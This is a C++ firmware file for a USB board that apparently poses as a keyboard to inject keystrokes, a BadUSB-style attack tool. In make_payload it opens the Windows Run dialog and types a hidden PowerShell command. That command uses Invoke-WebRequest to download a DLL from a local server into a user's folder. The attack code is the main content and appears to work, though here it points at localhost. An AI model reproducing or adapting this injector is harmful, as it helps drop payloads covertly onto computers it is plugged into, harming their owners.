#include "bsp/board.h"
#include "tusb.h"
#include "usb_descriptors.h"

#include "KeyStroke.hpp"
#include "BoardRuntime.hpp"
#include "Actions/IPayloadAction.hpp"
#include "Actions/SendKeystrokesAction.hpp"
#include "Actions/DelayAction.hpp"

void flash_led(uint32_t cooldown_millis = 1000)
{
    board_led_write(true);
    board_delay(1000);
    board_led_write(false);
    board_delay(1000);
}

static inline std::vector<uint8_t> as_buffer(const std::wstring& data)
{
    return { reinterpret_cast<const uint8_t *>(data.data()), reinterpret_cast<const uint8_t *>(data.data()) + data.size()};
}

static std::vector<IPayloadAction::Ptr> make_payload()
{
    std::vector<IPayloadAction::Ptr> result;

    const std::string powershell_script = "Invoke-WebRequest http://localhost:8000/SimpleDll.dll -OutFile C:\\Users\\alper\\bomboclat.dll";

    result.push_back(std::make_unique<SendKeyStrokesAction>(KeyStroke::from_special_binding(KeyStroke::SpecialKeyBinding::WIN_PLUS_R)));

    static constexpr uint32_t RUN_POPUP_OPEN_DURATION_MILLIS = 100;
    result.push_back(std::make_unique<DelayAction>(RUN_POPUP_OPEN_DURATION_MILLIS));

    const std::string run_powershell_script_command_line = "powershell -WindowStyle hidden -Command \"" + powershell_script + "\"\n";
    result.push_back(std::make_unique<SendKeyStrokesAction>(KeyStroke::from_string(run_powershell_script_command_line)));

    return result;
}

void main_logic()
{
    const std::vector<IPayloadAction::Ptr> payload = make_payload();

    for (const IPayloadAction::Ptr &action : payload)
    {
        action->run();
    }

    flash_led();
}

int main(void)
{
    try
    {
        BoardRuntime runtime;
        flash_led();
        main_logic();
        flash_led();
    }
    catch (...)
    {
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

// HID Get Report Callback (Host requests a report from the device)
uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t *buffer, uint16_t reqlen)
{
    static constexpr uint16_t DEFAULT_REPORT_NO_INFO = 0;
    return DEFAULT_REPORT_NO_INFO;
}

// HID Set Report Callback (Host sends a report to the device)
void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t const *buffer, uint16_t bufsize)
{
    // Ignore host features
}